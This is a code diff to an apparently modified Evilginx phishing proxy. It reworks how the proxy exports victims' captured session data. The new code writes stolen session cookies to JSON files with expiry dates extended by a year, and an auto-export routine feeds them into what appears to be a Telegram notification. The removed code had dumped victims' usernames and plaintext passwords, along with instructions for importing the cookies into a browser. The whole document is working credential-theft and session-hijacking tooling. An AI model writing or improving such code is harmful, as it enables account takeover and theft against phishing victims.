@@ -63,7 +63,7 @@ func (p *HttpProxy) ExportSessionToJSON(session *Session, sessionID int) (string
 	}
 
 	timestamp := time.Now()
-	filename := filepath.Join(exportDir, fmt.Sprintf("session_%d_%s.txt", sessionID, timestamp.Format("20060102_150405")))
+	filename := filepath.Join(exportDir, fmt.Sprintf("session_%d_%s.json", sessionID, timestamp.Format("20060102_150405")))
 
 	// Prepare session export data
 	export := SessionExport{
@@ -92,7 +92,6 @@ func (p *HttpProxy) ExportSessionToJSON(session *Session, sessionID int) (string
 	var cookies []ExportedCookie
 	for domain, tokens := range session.CookieTokens {
 		for name, token := range tokens {
-			// Use the actual secure value from the captured cookie
 			cookie := ExportedCookie{
 				Path:           token.Path,
 				Domain:         domain,
@@ -101,7 +100,7 @@ func (p *HttpProxy) ExportSessionToJSON(session *Session, sessionID int) (string
 				Name:           name,
 				HttpOnly:       token.HttpOnly,
 				HostOnly:       !startsWithDot(domain),
-				Secure:         token.Secure, // Use actual secure value from cookie
+				Secure:         token.Secure,
 				Session:        false,
 			}
 
@@ -114,40 +113,86 @@ func (p *HttpProxy) ExportSessionToJSON(session *Session, sessionID int) (string
 	}
 	export.Cookies = cookies
 
-	// No longer need full JSON marshal - we only export cookies
-
 	// Debug: Log cookie secure status
 	for _, cookie := range export.Cookies {
 		log.Debug("[telegram_export] Cookie %s secure=%v", cookie.Name, cookie.Secure)
 	}
 
-	// Generate cookies JSON array only
-	cookiesOnlyJSON, _ := json.Marshal(export.Cookies)
+	// Generate JSON export
+	jsonData, err := json.MarshalIndent(export, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal session export: %v", err)
+	}
 
-	// Write to file in the specific format requested
 	file, err := os.Create(filename)
 	if err != nil {
 		return "", fmt.Errorf("failed to create export file: %v", err)
 	}
 	defer file.Close()
 
-	// Write in the exact format requested
-	fmt.Fprintf(file, " id           : %d\n\n", sessionID)
-	fmt.Fprintf(file, "\n\n")
-	fmt.Fprintf(file, "domain     : %s\n\n", session.Name)
-	fmt.Fprintf(file, " username     : %s\n\n", session.Username)
-	fmt.Fprintf(file, " password     : %s\n\n", session.Password)
-	fmt.Fprintf(file, " user-agent   : %s\n\n", session.UserAgent)
-	fmt.Fprintf(file, "\n\n")
-	fmt.Fprintf(file, "(\n\n")
-	fmt.Fprintf(file, "\n\n")
-	fmt.Fprintf(file, "[ cookies ]\n\n")
-	fmt.Fprintf(file, "%s", string(cookiesOnlyJSON))
-	fmt.Fprintf(file, "\n\n")
-	fmt.Fprintf(file, "(use StorageAce extension to import the cookies: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo\n\n")
-	fmt.Fprintf(file, "\n\n")
+	if _, err := file.Write(jsonData); err != nil {
+		return "", fmt.Errorf("failed to write export file: %v", err)
+	}
+	if _, err := file.WriteString("\n"); err != nil {
+		return "", fmt.Errorf("failed to finalize export file: %v", err)
+	}
 
 	log.Success("[%d] session exported to JSON: %s", sessionID, filename)
+	return filename, nil
+}
+
+// ExportCookiesToJSON exports only the session cookies to a JSON file.
+func (p *HttpProxy) ExportCookiesToJSON(session *Session, sessionID int) (string, error) {
+	// Create export directory
+	exportDir := filepath.Join(os.TempDir(), "evilginx_exports")
+	if err := os.MkdirAll(exportDir, 0755); err != nil {
+		return "", fmt.Errorf("failed to create export directory: %v", err)
+	}
+
+	filename := filepath.Join(exportDir, fmt.Sprintf("cookies_session%d.json", sessionID))
+
+	var cookies []ExportedCookie
+	for domain, tokens := range session.CookieTokens {
+		for name, token := range tokens {
+			cookie := ExportedCookie{
+				Path:           token.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          token.Value,
+				Name:           name,
+				HttpOnly:       token.HttpOnly,
+				HostOnly:       !startsWithDot(domain),
+				Secure:         token.Secure,
+				Session:        false,
+			}
+
+			if cookie.Path == "" {
+				cookie.Path = "/"
+			}
+
+			cookies = append(cookies, cookie)
+		}
+	}
+
+	jsonData, err := json.MarshalIndent(cookies, "", "  ")
+	if err != nil {
+		return "", fmt.Errorf("failed to marshal cookies export: %v", err)
+	}
+
+	file, err := os.Create(filename)
+	if err != nil {
+		return "", fmt.Errorf("failed to create export file: %v", err)
+	}
+	defer file.Close()
+
+	if _, err := file.Write(jsonData); err != nil {
+		return "", fmt.Errorf("failed to write export file: %v", err)
+	}
+	if _, err := file.WriteString("\n"); err != nil {
+		return "", fmt.Errorf("failed to finalize export file: %v", err)
+	}
+
+	log.Success("[%d] cookies exported to JSON: %s", sessionID, filename)
 	return filename, nil
 }
 
@@ -190,10 +235,10 @@ func (p *HttpProxy) AutoExportAndSendSession(sessionID int, sid string) {
 		return
 	}
 
-	// Export to JSON file
-	filename, err := p.ExportSessionToJSON(session, sessionID)
+	// Export cookies-only JSON file
+	filename, err := p.ExportCookiesToJSON(session, sessionID)
 	if err != nil {
-		log.Error("failed to export session to JSON: %v", err)
+		log.Error("failed to export cookies to JSON: %v", err)
 		return
 	}
 
@@ -205,8 +250,7 @@ func (p *HttpProxy) AutoExportAndSendSession(sessionID int, sid string) {
 
 	cookieCount := 0
 	for _, tokens := range session.CookieTokens {
-		cookieCount = len(tokens)
-		break
+		cookieCount += len(tokens)
 	}
 
 	// Send tokens capture notification
